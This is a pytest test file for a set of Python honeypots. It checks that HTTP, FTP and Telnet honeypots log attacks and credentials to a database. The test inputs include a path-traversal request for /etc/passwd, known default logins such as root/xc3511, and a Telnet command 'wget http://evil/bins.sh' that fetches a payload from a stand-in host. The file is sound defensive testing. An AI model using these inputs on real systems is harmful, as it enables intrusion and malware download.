"""Tests for the native Python honeypots — capture flow and DB persistence."""

import http.client
import socket
import time

import pytest

from src.db.fallback_store import FallbackDB
from src.honeypots import FTPHoneypot, HTTPHoneypot, TelnetHoneypot, HoneypotManager


@pytest.fixture
def db(tmp_path):
    database = FallbackDB(str(tmp_path / "hp.db"))
    yield database
    database.close()


def _wait_for_events(db, n, timeout=3.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if db["alert_events"].count_documents({}) >= n:
            return
        time.sleep(0.05)


def test_http_honeypot_records_path_traversal(db):
    hp = HTTPHoneypot(host="127.0.0.1", port=0, db=db).start()
    try:
        conn = http.client.HTTPConnection("127.0.0.1", hp.port, timeout=5)
        conn.request("GET", "/../../etc/passwd", headers={"User-Agent": "nikto"})
        resp = conn.getresponse()
        resp.read()
        conn.close()
        _wait_for_events(db, 1)
    finally:
        hp.stop()

    event = db["alert_events"].find_one({"honeypot_source": "http"}, {"_id": 0})
    assert event is not None
    assert event["attack_type"] == "data_exfiltration"
    assert event["severity"] == "high"


def test_http_honeypot_captures_login_credentials(db):
    hp = HTTPHoneypot(host="127.0.0.1", port=0, db=db).start()
    try:
        conn = http.client.HTTPConnection("127.0.0.1", hp.port, timeout=5)
        conn.request(
            "POST", "/login", "username=admin&password=s3cr3t",
            {"Content-Type": "application/x-www-form-urlencoded"},
        )
        conn.getresponse().read()
        conn.close()
        _wait_for_events(db, 1)
    finally:
        hp.stop()

    event = db["alert_events"].find_one({"attack_type": "brute_force"}, {"_id": 0})
    assert event is not None
    assert event["username"] == "admin"
    assert event["password"] == "s3cr3t"


def test_ftp_honeypot_captures_credentials(db):
    hp = FTPHoneypot(host="127.0.0.1", port=0, db=db).start()
    try:
        s = socket.create_connection(("127.0.0.1", hp.port), timeout=5)
        assert b"220" in s.recv(128)
        s.sendall(b"USER root\r\n"); s.recv(128)
        s.sendall(b"PASS toor\r\n"); s.recv(128)
        s.close()
        _wait_for_events(db, 1)
    finally:
        hp.stop()

    event = db["alert_events"].find_one({"honeypot_source": "ftp"}, {"_id": 0})
    assert event is not None
    assert event["username"] == "root"
    assert event["password"] == "toor"


def test_telnet_default_creds_open_shell_and_log_commands(db):
    hp = TelnetHoneypot(host="127.0.0.1", port=0, db=db).start()
    try:
        s = socket.create_connection(("127.0.0.1", hp.port), timeout=5)
        s.recv(128)
        s.sendall(b"root\r\n"); s.recv(128)
        s.sendall(b"xc3511\r\n"); time.sleep(0.2); s.recv(256)
        s.sendall(b"wget http://evil/bins.sh\r\n"); time.sleep(0.2); s.recv(256)
        s.close()
        _wait_for_events(db, 2)
    finally:
        hp.stop()

    cmd_event = db["alert_events"].find_one(
        {"honeypot_source": "telnet", "attack_type": "command_injection"}, {"_id": 0}
    )
    assert cmd_event is not None
    assert "wget" in cmd_event["command"]


def test_session_is_persisted(db):
    hp = FTPHoneypot(host="127.0.0.1", port=0, db=db).start()
    try:
        s = socket.create_connection(("127.0.0.1", hp.port), timeout=5)
        s.recv(128)
        s.sendall(b"USER bob\r\n"); s.recv(128)
        s.sendall(b"PASS pw\r\n"); s.recv(128)
        s.close()
        _wait_for_events(db, 1)
        time.sleep(0.2)
    finally:
        hp.stop()

    session = db["honeypot_sessions"].find_one({"honeypot": "ftp"}, {"_id": 0})
    assert session is not None
    assert session["src_ip"] == "127.0.0.1"
    assert len(session["credentials"]) >= 1


def test_manager_builds_and_reports_status(db):
    mgr = HoneypotManager(
        db=db, host="127.0.0.1",
        ports={"ssh": 0, "http": 0, "ftp": 0, "telnet": 0},
    ).build(["http", "ftp"])
    mgr.start()
    try:
        status = mgr.status()
        names = {s["name"] for s in status}
        assert names == {"http", "ftp"}
        assert all(s["running"] for s in status)
        assert all(s["port"] > 0 for s in status)
    finally:
        mgr.stop()
